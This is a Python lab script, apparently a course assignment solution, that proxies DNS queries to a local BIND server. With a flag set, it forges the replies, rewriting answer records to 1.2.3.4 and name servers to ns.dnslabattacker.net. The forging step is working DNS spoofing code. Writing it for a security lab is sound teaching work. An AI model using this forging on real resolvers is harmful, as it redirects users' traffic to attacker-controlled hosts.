#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

# BIND's host
host = "127.0.0.1"

# Buffer Size Initialization
BUFF_SIZE = 4096

print("The port is: ", port)
print("The DNS port is: ", dns_port)

if __name__ == "__main__":
    # Create sockets for the Client and Server side
    serverSide = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    clientSide = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    serverAddress = (host, port)
    serverSide.bind(serverAddress)

    # Infinitely listen to connections
    while (True):
        # Receive data and the address of dig 
        data, digAddress = serverSide.recvfrom(BUFF_SIZE)
        # Check if we are actually getting data or not
        if (len(data) == 0):
            print("Dig provides zero data.")
            exit(1)
        else:
            print("Successfuly received non-zero data from dig.")
        # Forward the data to the BIND
        clientAddress = (host, dns_port)
        clientSide.sendto(data, clientAddress)
        print("Forwarded data to bind.")
        # Listen for response from Bind
        responseBind = clientSide.recv(BUFF_SIZE)
        if (len(responseBind) == 0):
            print("Bind provides zero data.")
            exit(1)
        else:
            print("Successfuly received non-zero data from bind.")
            
        if SPOOF:
            print("Spoofing")
            
            # Use the proxy created in Part 2 to intercept and forge DNS replies
            responseBind = DNS(responseBind)
            
            # Change the IP address to 1.2.3.4 instead
            responseBind.an[0].rdata = '1.2.3.4'
            
            # Change its name servers to ns.dnslabattacker.net
            responseBind.ns[0].rdata = 'ns.dnslabattacker.net'
            responseBind.ns[1].rdata = 'ns.dnslabattacker.net'
              
        # Reply to dig
        serverSide.sendto(bytes(responseBind), digAddress)
        print("Successfully replied back to dig.")
